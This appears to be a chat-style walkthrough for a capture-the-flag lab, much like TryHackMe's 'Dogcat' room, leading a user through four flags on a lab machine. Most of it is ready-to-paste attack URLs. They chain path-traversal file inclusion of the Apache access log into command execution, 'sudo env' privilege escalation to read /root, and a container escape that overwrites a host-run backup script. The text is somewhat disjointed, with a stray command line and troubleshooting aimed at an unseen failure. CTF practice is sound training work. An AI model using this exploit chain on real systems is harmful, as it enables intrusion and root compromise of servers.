### 1. Flag 1 (Confirmed)

You already found it in the Base64 string you provided:  
PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo/Pgo=  
**Decoded:** <?php $flag_1 = "THM{Th1s_1s_1s_N0t_4_Catdog_ab67edfa}" ?>

?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=hostname

### Retrieve Flag 2

The find command you ran earlier revealed the location: /var/www/flag2_QMW7JvaY2LvK.txt.

**Run this command to read it:**

> http://10.113.176.168/?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=cat /var/www/flag2_QMW7JvaY2LvK.txt

### Find Flag 3 (Privilege Escalation)

You are currently www-data. You need to see if you can run commands as root.

**1. Check Sudo permissions:**  
Use this URL:

> http://10.113.176.168/?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=sudo -l

**2. Look for the "env" exploit:**  
If the output shows that you can run /usr/bin/env without a password, you can use it to read the root directory.

**3. List the /root directory:**

> http://10.113.176.168/?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=sudo env ls -la /root

**4. Read Flag 3:**  
Look for a file named flag3.txt in that list and cat it:

> http://10.113.176.168/?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=sudo env cat /root/flag3.txt


###  Find Flag 4 (Docker Escape)

Flag 4 is not inside the container. You have to find a way to run a command on the host machine.

**1. Look for interesting directories:**  
In your previous ls -la / output, check the /opt directory. There is often a backups folder there.

> http://10.113.176.168/?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=ls -la /opt/backups

## Force the write to the script

We will use sh -c. This tells the system to run the entire command string (including the redirection) as root.

**Copy and paste this exact URL:**

>http://10.113.176.168/?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=sudo env sh -c 'echo "#!/bin/bash" > /opt/backups/backup.sh && echo "cp /root/flag4.txt /root/container/backup/flag4.txt" >> /opt/backups/backup.sh'

The reason it's not working is a **path mismatch** between the container and the host.

Think of it this way:

- **You (Inside the container)** see the folder as /opt/backups/.
- **The Host (The computer running the script)** sees that same folder as /root/container/backup/.

When the host runs your current script, it tries to copy the flag to /opt/backups/flag4.txt. Since the host doesn't have an /opt/backups folder on its own filesystem, the command fails silently.

### The Solution: Correct the Host Path

We need to tell the host to copy the flag to the path **it** understands.
**Run this command to overwrite the script with the correct host-relative path:**

> http://10.113.176.168/?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=echo "cp /root/flag4.txt /root/container/backup/flag4.txt" > /opt/backups/backup.sh

---
